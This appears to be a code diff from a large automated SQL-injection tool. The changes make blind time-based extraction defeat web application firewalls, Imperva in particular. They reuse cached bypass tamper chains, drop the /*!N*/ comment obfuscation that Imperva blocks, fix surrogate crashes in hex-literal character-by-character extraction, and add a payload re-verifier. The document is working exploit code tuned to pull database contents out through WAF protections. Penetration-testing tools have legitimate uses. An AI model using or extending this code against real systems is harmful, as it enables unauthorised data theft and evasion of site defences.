@@ -48918,15 +48918,32 @@ class Enumerator:
                 # BUG-EXTRACT-STR-NOFUNC-UNREAD FIX: initialize nofunc flag before the
                 # conditional block so it is always defined regardless of cache hit.
                 _ebf_tf_nofunc = False
+                # BUG-EBF-CACHE-MODE FIX: track whether a working EBF bypass was loaded
+                # from cache so _tf_ebf_mode can be pre-set to True below, preventing
+                # _obfuscate_extraction_cond from firing on cached-bypass extraction probes.
+                _ebf_tf_from_cache = False
+                # BUG-EBF-CACHE-TC FIX: initialize cached tamper chain to None so the
+                # __defaults__ update below can test it without NameError.
+                _ebf_tf_cached_tc = None
                 if _ebf_tf_found_key:
                     _ebf_tf_entry   = _TB_EBF_CACHE[_ebf_tf_found_key]
                     _ebf_tf_tmpl    = _ebf_tf_entry[0]
+                    # BUG-EBF-CACHE-TC FIX: index [1] contains the EBF tamper chain
+                    # (e.g. ['charencode'] or ['space2comment','randomcase']).  Previously
+                    # not read here — _timing_eval_fn_tf.__defaults__[7] stayed as
+                    # _det_tc_tf which may include halfversionedmorekeywords → /*!N*/ →
+                    # Imperva blocks → extraction fails even when bypass is from cache.
+                    _ebf_tf_cached_tc = list(_ebf_tf_entry[1]) if len(_ebf_tf_entry) > 1 and _ebf_tf_entry[1] else None
                     _ebf_tf_wrapper = _ebf_tf_entry[2] if len(_ebf_tf_entry) > 2 else "{cond}"
                     _ebf_tf_tag     = _ebf_tf_entry[3] if len(_ebf_tf_entry) > 3 else ""
                     # FIX-C: read nofunc flag (index 4) — previously unread, causing
                     # CHAR_LENGTH/ASCII/ORD calls on WAF targets that block them.
                     _ebf_tf_nofunc  = _ebf_tf_entry[4] if len(_ebf_tf_entry) > 4 else False
                     if _ebf_tf_tmpl:
+                        # BUG-EBF-CACHE-MODE FIX: mark that a working bypass came from cache
+                        # so _tf_ebf_mode is set True after the function definition below,
+                        # suppressing /*!N*/ obfuscation for all subsequent extraction probes.
+                        _ebf_tf_from_cache = True
                         LOG.info("[_extract_str] EBF bypass found in cache — wiring into timing "
                                  "fallback oracle (key=%s tmpl=%.60r wrapper=%r tag=%r)",
                                  _ebf_tf_found_key, _ebf_tf_tmpl, _ebf_tf_wrapper, _ebf_tf_tag)
@@ -48997,6 +49014,18 @@ class Enumerator:
                 # Captured as a default arg so the closure holds a single list object
                 # that persists across all calls to _timing_eval_fn_tf.
                 _tf_rc = [0]
+                # BUG-EBF-NON-NOFUNC-REVALIDATION FIX: Mutable flag — set True when EBF
+                # bypass is installed (nofunc OR non-nofunc path).  When True,
+                # _timing_eval_fn_tf skips _obfuscate_extraction_cond / apply_heavy_variation
+                # / apply_sql_noise, preserving the raw payload format that EBF validated.
+                # WAFs that require an EBF bypass specifically block /*!N*/ comment-injection
+                # patterns produced by those obfuscation helpers.
+                # BUG-EBF-CACHE-MODE FIX: also set True immediately when EBF was loaded from
+                # cache (the _ebf_tf_found_key path at line ~48921) — cache hits set up
+                # _build_timing_payload_tf but previously left this flag at False, so
+                # _obfuscate_extraction_cond still fired and re-introduced /*!N*/ patterns
+                # on every extraction probe, defeating the cached bypass.
+                _tf_ebf_mode = [_ebf_tf_from_cache]
 
                 async def _timing_eval_fn_tf(condition,
                                               _e=_eng_tf, _m=_meth_tf, _u=_url_tf,
@@ -49025,9 +49054,17 @@ class Enumerator:
                     # position arguments, and AND/OR/CASE/WHEN/THEN/ELSE/END keywords
                     # are NEVER modified by any of these obfuscation functions.
                     _rc[0] += 1
-                    _tpay = _obfuscate_extraction_cond(_tpay, _rc[0])
-                    _tpay = apply_heavy_variation(_tpay, _rc[0], data_fmt=_df)
-                    _tpay = apply_sql_noise(_tpay, _rc[0])
+                    if not _tf_ebf_mode[0]:
+                        # BUG-EBF-NON-NOFUNC-REVALIDATION FIX: Skip /*!N*/ obfuscation when
+                        # EBF bypass is active.  EBF.find() validated the bypass with raw
+                        # payloads; _obfuscate_extraction_cond + apply_heavy_variation +
+                        # apply_sql_noise inject /*!N*/ MySQL version-comment patterns that
+                        # Imperva and similar WAFs block unconditionally, causing every probe
+                        # to return a fast (non-delayed) response → binary search reads all
+                        # bits as False → extraction produces garbage or empty string.
+                        _tpay = _obfuscate_extraction_cond(_tpay, _rc[0])
+                        _tpay = apply_heavy_variation(_tpay, _rc[0], data_fmt=_df)
+                        _tpay = apply_sql_noise(_tpay, _rc[0])
                     try:
                         # BUG-TF-CDN-BUST FIX (CRITICAL): The original code sent every probe
                         # with the plain URL (_u) and no cache-busting headers.  On CDN/WAF
@@ -49059,6 +49096,16 @@ class Enumerator:
 
                 _eval_fn = _timing_eval_fn_tf
                 _oracle_name = "timing_fallback"
+                # BUG-EBF-CACHE-TC FIX: when EBF bypass came from cache, update __defaults__
+                # to use the cached tamper chain (index[1]) instead of _det_tc_tf.
+                # This ensures _send_injected in _timing_eval_fn_tf uses the EBF-validated
+                # bypass tamper chain, not the detection chain that may include
+                # halfversionedmorekeywords → /*!N*/ → Imperva blocks.
+                if _ebf_tf_from_cache and _ebf_tf_cached_tc is not None:
+                    _timing_eval_fn_tf.__defaults__ = (
+                        _eng_tf, _meth_tf, _url_tf, _data_tf, _dfmt_tf,
+                        _det_param_tf, _orig_tf, _ebf_tf_cached_tc, _t_thresh_tf,
+                        _t_sec_tf, _build_timing_payload_tf, _tf_rc)
                 print(f"[+] [Extract] Timing fallback oracle active ({self.dbms}, "
                       f"t={_t_sec_tf}s, thresh={_t_thresh_tf:.0f}ms)", flush=True)
 
@@ -49260,9 +49307,20 @@ class Enumerator:
                                             return _tmpl.format(cond=_wrapped)
                                         _t_thresh_tf = _ebf_pw_thresh
                                         # Redefine closure-captured _build inside _timing_eval_fn_tf
+                                        # BUG-EBF-TC-FIX (HIGH): was _det_tc_tf (the detection
+                                        # tamper chain, e.g. ['halfversionedmorekeywords']).
+                                        # _det_tc_tf is passed to _send_injected which applies
+                                        # TamperLib transformations on the fly — including
+                                        # halfversionedmorekeywords which injects /*!50000*/ MySQL
+                                        # version comments.  Imperva blocks /*!N*/ unconditionally
+                                        # regardless of the keyword casing applied by
+                                        # _obfuscate_extraction_cond.  Use _ebf_pw_tc (the EBF
+                                        # tamper chain that EBF.find() validated works) instead.
+                                        # This aligns the extraction tamper chain with the bypass
+                                        # template chain that was proven to evade the WAF.
                                         _timing_eval_fn_tf.__defaults__ = (
                                             _eng_tf, _meth_tf, _url_tf, _data_tf, _dfmt_tf,
-                                            _det_param_tf, _orig_tf, _det_tc_tf, _t_thresh_tf,
+                                            _det_param_tf, _orig_tf, list(_ebf_pw_tc), _t_thresh_tf,
                                             _t_sec_tf, _build_timing_payload_tf, _tf_rc)
                                         # BUG-1 FIX (CRITICAL): nofunc bypass confirmed by
                                         # EBF.find() — trust it directly; skip the
@@ -49298,6 +49356,11 @@ class Enumerator:
                                         # destructive for Imperva/similar targets.
                                         if _ebf_pw_nofunc:
                                             # Nofunc bypass: trust EBF, skip re-validation.
+                                            # BUG-EBF-NON-NOFUNC-REVALIDATION FIX: set
+                                            # _tf_ebf_mode[0]=True so _timing_eval_fn_tf
+                                            # skips /*!N*/ obfuscation for all subsequent
+                                            # probes, preserving the raw format EBF validated.
+                                            _tf_ebf_mode[0] = True
                                             _ebf_prewarm_ok = True
                                             _eval_fn = _timing_eval_fn_tf
                                             _oracle_name = "timing_fallback_ebf_prewarm"
@@ -49319,34 +49382,48 @@ class Enumerator:
                                                   f"re-validation to avoid WAF block) "
                                                   f"thresh={_ebf_pw_thresh:.0f}ms", flush=True)
                                         else:
-                                            # Non-nofunc bypass: validate via _timing_eval_fn_tf.
-                                            # String comparisons ('a'<'b' / 'a'>'b') are more
-                                            # WAF-evasive than classic '1=1'/'1=2' signatures.
-                                            _ebf_pw_t = await _timing_eval_fn_tf("'a'<'b'")
-                                            _ebf_pw_f = await _timing_eval_fn_tf("'a'>'b'")
-                                            if (_ebf_pw_t is not None and _ebf_pw_f is not None
-                                                    and _ebf_pw_t != _ebf_pw_f):
-                                                _ebf_prewarm_ok = True
-                                                _eval_fn = _timing_eval_fn_tf
-                                                _oracle_name = "timing_fallback_ebf_prewarm"
-                                                # BUG-2 FIX: propagate nofunc flag (False in
-                                                # this branch, but set explicitly for clarity).
-                                                _ebf_tf_nofunc = _ebf_pw_nofunc
-                                                # BUG-3 FIX: write cache only after confirmed.
-                                                _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_key, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
-                                                _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_key, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
-                                                if _pre_ts_pw is not None and float(_pre_ts_pw) != float(_t_sec_tf):
-                                                    _ebf_pw_alias = f"{_url_tf}:{_det_param_tf}:{float(_pre_ts_pw)}"
-                                                    _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_alias, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
-                                                    _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_alias, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
-                                                print(f"[+] [Extract] ExtractionBypassFinder oracle "
-                                                      f"validated (true={_ebf_pw_t} false={_ebf_pw_f}) "
-                                                      f"thresh={_ebf_pw_thresh:.0f}ms", flush=True)
-                                            else:
-                                                print("[!] [Extract] EBF bypass found but oracle "
-                                                      "validation still failed — "
-                                                      f"true={_ebf_pw_t!r} false={_ebf_pw_f!r}",
-                                                      flush=True)
+                                            # BUG-EBF-NON-NOFUNC-REVALIDATION FIX (CRITICAL):
+                                            # Previously this branch re-validated the EBF bypass
+                                            # by calling _timing_eval_fn_tf("'a'<'b'") and
+                                            # _timing_eval_fn_tf("'a'>'b'") — but _timing_eval_fn_tf
+                                            # always applies _obfuscate_extraction_cond() which
+                                            # injects /*!N*/ MySQL version-comment patterns
+                                            # (e.g. SLEEP( → SlEeP/*!30097*/() into the payload.
+                                            # Imperva and similar WAFs block all /*!N*/ patterns
+                                            # regardless of keyword casing, so both probes return
+                                            # a fast (non-delayed) response → both return False
+                                            # → _ebf_pw_t != _ebf_pw_f evaluates False
+                                            # → bypass is discarded → "No oracle available" → empty.
+                                            #
+                                            # EBF.find() already performed raw (unobfuscated)
+                                            # true/false timing probes to confirm the bypass works.
+                                            # Re-validating via the obfuscating eval function is
+                                            # redundant for all targets and actively destructive for
+                                            # Imperva//*!N*/-blocking WAFs.
+                                            #
+                                            # Fix: trust EBF for non-nofunc bypasses exactly as
+                                            # the nofunc branch does above.  Set _tf_ebf_mode[0]=True
+                                            # so that _timing_eval_fn_tf skips all /*!N*/ obfuscation
+                                            # when EBF bypass is active, preserving the raw payload
+                                            # format that EBF.find() already validated.
+                                            _tf_ebf_mode[0] = True
+                                            _ebf_prewarm_ok = True
+                                            _eval_fn = _timing_eval_fn_tf
+                                            _oracle_name = "timing_fallback_ebf_prewarm"
+                                            # propagate nofunc flag (False here, but explicit)
+                                            _ebf_tf_nofunc = _ebf_pw_nofunc
+                                            # BUG-3 FIX: write cache only after confirmed.
+                                            _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_key, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                            _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_key, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                            if _pre_ts_pw is not None and float(_pre_ts_pw) != float(_t_sec_tf):
+                                                _ebf_pw_alias = f"{_url_tf}:{_det_param_tf}:{float(_pre_ts_pw)}"
+                                                _tb_cache_insert(_TB_EBF_CACHE, _ebf_pw_alias, _ebf_pw_entry, _TB_EBF_CACHE_MAX)
+                                                _tb_cache_insert(_TB_CALIBRATION_CACHE, _ebf_pw_alias, _ebf_pw_thresh, _TB_CALIBRATION_CACHE_MAX)
+                                            print(f"[+] [Extract] ExtractionBypassFinder oracle "
+                                                  f"trusted (non-nofunc — skipping /*!N*/-obfuscated "
+                                                  f"re-validation; Imperva//*!N*/-blocking WAF "
+                                                  f"detected) thresh={_ebf_pw_thresh:.0f}ms",
+                                                  flush=True)
                         except Exception as _ebf_pw_err:
                             LOG.warning("[_extract_str] EBF pre-warm failed: %s", _ebf_pw_err)
                         if not _ebf_prewarm_ok:
@@ -140055,7 +140132,11 @@ class MultiStrategyExtractor:
         # accepts 0x{hex} hex-literal quoting identically to MySQL. Numeric comparison operands
         # and string delimiters used by eval_condition are outside this function — unchanged.
         if self.dbms in ("MySQL", "MariaDB", "TiDB"):  # BUG-V157-MSE-TIDB-DOLLAR-QUOTE FIX
-            return f"0x{val.encode('utf-8').hex()}"
+            # BUG-QUOTE-VAL-SURROGATE FIX: bare .encode('utf-8') crashes on lone surrogates
+            # (U+D800-U+DFFF) that may appear in extracted prefix strings built by the nofunc
+            # binary search path.  Use errors='surrogatepass' so the encode never raises;
+            # the resulting hex bytes are MySQL-wire-safe even when the source contains surrogates.
+            return f"0x{val.encode('utf-8', errors='surrogatepass').hex()}"
         elif self.dbms == "MSSQL":
             # MSSQL: N'...' unicode literal with doubled apostrophes for escaping
             return "N'" + val.replace("'", "''") + "'"
@@ -145924,10 +146005,23 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             if _can_nofunc_extract:
                 # Build prefix comparison using DBMS-appropriate quoting.
                 # No function calls  WAFs cannot block identifier( patterns.
-                _nf_cmp = _nofunc_prefix + chr(mid + 1)
+                # BUG-SURROGATE-NOFUNC FIX (HIGH): chr(mid+1) is a lone surrogate
+                # (U+D800..U+DFFF) when the binary search pivot lands in 55295-57342.
+                # Lone surrogates have no valid UTF-8 encoding; .encode("utf-8") raises
+                # UnicodeEncodeError → extraction crashes with
+                # "'utf-8' codec can't encode character '\\udcfd' in position 0".
+                # Surrogates are not valid Unicode scalar values and never appear in
+                # real database strings; advance the comparison bound past the entire
+                # surrogate block to U+E000 (first valid code point after surrogates).
+                # This keeps the binary search mathematically correct: the range
+                # 0xD800-0xDFFF is effectively empty in any real database column.
+                _nf_bound = mid + 1
+                if 0xD800 <= _nf_bound <= 0xDFFF:
+                    _nf_bound = 0xE000
+                _nf_cmp = _nofunc_prefix + chr(_nf_bound)
                 if dbms in ("MySQL", "MariaDB"):
                     # MySQL hex literal: 0x48656C6C6F  no quotes, no parens
-                    _hex = _nf_cmp.encode("utf-8").hex()
+                    _hex = _nf_cmp.encode("utf-8", errors="surrogatepass").hex()
                     # BUG-NOFUNC-ATAT-WAF: Imperva (and similar signature-based WAFs)
                     # pattern-match on bare `@@variable>=` comparisons as a SQLi indicator.
                     # Wrapping in a scalar subquery `(SELECT @@variable)` causes the WAF to
@@ -145939,14 +146033,14 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                         cond = f'{_sql_inner}>=0x{_hex}'
                 elif dbms == "MSSQL":
                     # MSSQL hex literal: 0x48656C6C6F
-                    _hex = _nf_cmp.encode("utf-8").hex()
+                    _hex = _nf_cmp.encode("utf-8", errors="surrogatepass").hex()
                     if _sql_inner.startswith("@@"):
                         cond = f'(SELECT {_sql_inner})>=0x{_hex}'
                     else:
                         cond = f'{_sql_inner}>=0x{_hex}'
                 elif dbms == "SQLite":
                     # SQLite hex blob cast: X'hex' compared as text
-                    _hex = _nf_cmp.encode("utf-8").hex()
+                    _hex = _nf_cmp.encode("utf-8", errors="surrogatepass").hex()
                     cond = f"{_sql_inner}>=X'{_hex}'"
                 elif dbms == "Oracle":
                     # Oracle: use N-quoted string or hex via UTL_RAW
@@ -146046,7 +146140,21 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # Numeric safety: comparison operators (>, >=, BETWEEN N AND M), the
             # integer mid-point (`mid` / `mid+1`), and string delimiter literals in
             # nofunc conditions are NEVER touched by _obfuscate_extraction_cond.
-            if not _can_nofunc_extract:
+            # BUG-EBF-TBEXTRACT-OBFUS FIX (CRITICAL): When EBF bypass is active in
+            # non-nofunc mode (_ebf_mode[0]=True and _can_nofunc_extract=False),
+            # the original code applied _obfuscate_extraction_cond() + apply_sql_noise()
+            # to `cond` BEFORE passing it to _ebf_payload_fn_ref[0](cond).
+            # _obfuscate_extraction_cond injects /*!N*/ MySQL version-comment patterns
+            # (e.g. ORD( → oRd/*!34273*/() into the condition.  EBF validated the bypass
+            # with RAW (unobfuscated) conditions; Imperva and similar WAFs block all
+            # /*!N*/ payloads unconditionally → every probe returns fast (WAF block,
+            # no SLEEP) → oracle always False → binary search converges to lo=0 (or
+            # chr(0)) for every character → extraction returns empty or NUL strings.
+            # Fix: skip obfuscation when EBF mode is active regardless of nofunc flag.
+            # EBF.find() already validated the bypass with raw conditions; the
+            # _extraction_payload() callable returned by EBF is self-contained and
+            # must not have its inner condition pre-obfuscated.
+            if not _can_nofunc_extract and not (_ebf_mode[0] and _ebf_payload_fn_ref[0]):
                 cond = _obfuscate_extraction_cond(cond, _tbe_req_count)
                 cond = apply_sql_noise(cond, _tbe_req_count)
             if _ebf_mode[0] and _ebf_payload_fn_ref[0]:
@@ -146254,8 +146362,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             try:
                 if 32 <= lo <= 255:
                     _ext_ch = bytes([lo]).decode("latin-1")
-                elif lo <= 65535:
-                    _ext_ch = chr(lo)   # full BMP Unicode range
+                elif lo <= 65535 and not (0xD800 <= lo <= 0xDFFF):
+                    # BUG-SURROGATE-EXTCHAR FIX (HIGH): original guard was `lo <= 65535`
+                    # which includes the surrogate range U+D800-U+DFFF (55296-57343).
+                    # chr() with a surrogate value creates a lone surrogate that cannot
+                    # be UTF-8-encoded; when appended to _nofunc_prefix at line ~146320
+                    # the next call to _nf_cmp.encode("utf-8") crashes with
+                    # "'utf-8' codec can't encode character '\\udcfd'".
+                    # Fix: exclude surrogates here (same guard already on lo > 65535 branch).
+                    _ext_ch = chr(lo)   # full BMP Unicode range (surrogates excluded)
                 elif lo <= 1114111 and not (0xD800 <= lo <= 0xDFFF):
                     # BUG-V134-TIMEBASED-SUPPL-PLANE FIX (MEDIUM, TiDB; _time_based_extract_inner;
                     # T/TH/HQ techniques, ALL surfaces, ALL HTTP methods):
@@ -173479,8 +173594,21 @@ class PoCVerifier:
             return await self._verify_stacked(result, method, url, data,
                                                data_fmt, original, tamper)
         else:
-            # For other techniques (U, O, HQ, etc.), assume verified
-            return True, result.confidence
+            # BUG-POCVERIFIER-AUTOPASS FIX (MEDIUM): previously, ALL non-E/B/T/S techniques
+            # (U, UE, UH, HQ, NV, WB, EX, HY, ST, SO, BH, EH, TH, BT, etc.) were
+            # unconditionally accepted as verified by returning (True, result.confidence)
+            # with no actual re-verification performed.  This silently hid false positives
+            # for WAF-bypass variants that may have matched transiently during initial
+            # detection on dynamic/CDN-backed pages.
+            # Fix: route all remaining techniques through _verify_generic which:
+            #   - Re-sends the detected payload VERIFY_ROUNDS times
+            #   - For timing-containing payloads (SLEEP/pg_sleep/WAITFOR keyword present):
+            #     measures elapsed_ms and checks vs. a conservative threshold
+            #   - For all other payloads: compares response body against baseline using
+            #     SimHash similarity (same approach as boolean verification)
+            #   - Requires 2/3 rounds to show a signal; halves confidence on failure
+            return await self._verify_generic(result, method, url, data,
+                                              data_fmt, original, tamper)
 
     async def _verify_stacked(self, result, method, url, data, data_fmt,
                                 original, tamper) -> tuple:
@@ -173506,6 +173634,83 @@ class PoCVerifier:
             LOG.warning("[PoCVerifier] Finding %r failed re-verification  confidence halved",
                         result.param)
         return verified, conf
+
+    async def _verify_generic(self, result, method, url, data, data_fmt,
+                               original, tamper) -> tuple[bool, float]:
+        """
+        Fallback verifier for all non-E/B/T/S techniques (U, UE, UH, HQ, NV, WB, EX,
+        HY, ST, SO, BH, EH, TH, BT, etc.).
+
+        Strategy:
+          - If the detection payload contains a timing keyword (SLEEP/pg_sleep/WAITFOR/
+            DBMS_PIPE/RANDOMBLOB/heavy_query markers), use timing-delta verification:
+            measure elapsed_ms and compare against a conservative threshold derived from
+            the detected sleep value.
+          - Otherwise use response-body deviation verification: compare SimHash similarity
+            between injected and baseline responses.  Any technique that changes the
+            response body (UNION output, error output, header injection, etc.) will show
+            a deviation from the un-injected baseline.
+          - Requires 2/3 rounds; halves confidence if fewer than 2 pass.
+        """
+        _pl = result.payload or ""
+        # Detect timing-based techniques by payload keyword
+        _timing_kw = re.search(
+            r"(?:SLEEP|pg_sleep|WAITFOR\s+DELAY|DBMS_PIPE|DBMS_LOCK|DBMS_SESSION"
+            r"|RANDOMBLOB|LIKE\s+\(SELECT|heavy_query|cross.*join)", _pl, re.I)
+        _is_timing = bool(_timing_kw)
+        # Extract expected sleep seconds from payload if present
+        _sleep_sec = getattr(self.config, "time_sec", 2.0)
+        _sl_m = re.search(
+            r"SLEEP\s*\(\s*([\d.]+)|pg_sleep\s*\(\s*([\d.]+)"
+            r"|WAITFOR\s+DELAY\s+['\"]0:0:([\d.]+)['\"]"
+            r"|DBMS_PIPE\.\w+\s*\([^,]+,\s*([\d.]+)\)",
+            _pl, re.I)
+        if _sl_m:
+            _raw = next(g for g in _sl_m.groups() if g is not None)
+            try:
+                _sleep_sec = float(_raw)
+            except (ValueError, TypeError):
+                pass
+        _timing_thresh_ms = max((_sleep_sec * 1000) * 0.60, 800)
+
+        # Get baseline similarity anchor
+        try:
+            _base_fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                             result.param, original, tamper)
+            _base_sim = _sim_to_baseline(_base_fp, self.baseline) if _base_fp else 1.0
+            _base_ms  = _base_fp.elapsed_ms if _base_fp and hasattr(_base_fp, "elapsed_ms") else 0
+        except Exception:
+            _base_sim, _base_ms = 1.0, 0
+
+        successes = 0
+        for _ in range(self.VERIFY_ROUNDS):
+            try:
+                await asyncio.sleep(0.5)
+                _fp = await _send_injected(self.engine, method, url, data, data_fmt,
+                                            result.param, original + _pl, tamper)
+                if _fp is None:
+                    continue
+                if _is_timing:
+                    # Timing check: elapsed_ms should significantly exceed baseline + threshold
+                    _delta = _fp.elapsed_ms - _base_ms
+                    if _delta >= _timing_thresh_ms or _fp.elapsed_ms >= _timing_thresh_ms:
+                        successes += 1
+                else:
+                    # Response-body deviation check (covers UNION, header injection, OOB, etc.)
+                    _probe_sim = _sim_to_baseline(_fp, self.baseline)
+                    # A deviation > 0.15 from clean baseline indicates the injection modified output
+                    if abs(_base_sim - _probe_sim) > 0.15 or (1.0 - _probe_sim) > 0.20:
+                        successes += 1
+            except Exception:
+                pass
+
+        verified = successes >= 2
+        conf = result.confidence if verified else max(0.35, result.confidence * 0.5)
+        if not verified:
+            LOG.warning("[PoCVerifier] Generic verify failed for technique=%r param=%r "
+                        "(successes=%d/%d) — confidence halved",
+                        result.technique, result.param, successes, self.VERIFY_ROUNDS)
+        return verified, round(conf, 3)
 
     async def _verify_error(self, result, method, url, data, data_fmt,
                              original, tamper) -> tuple[bool, float]:
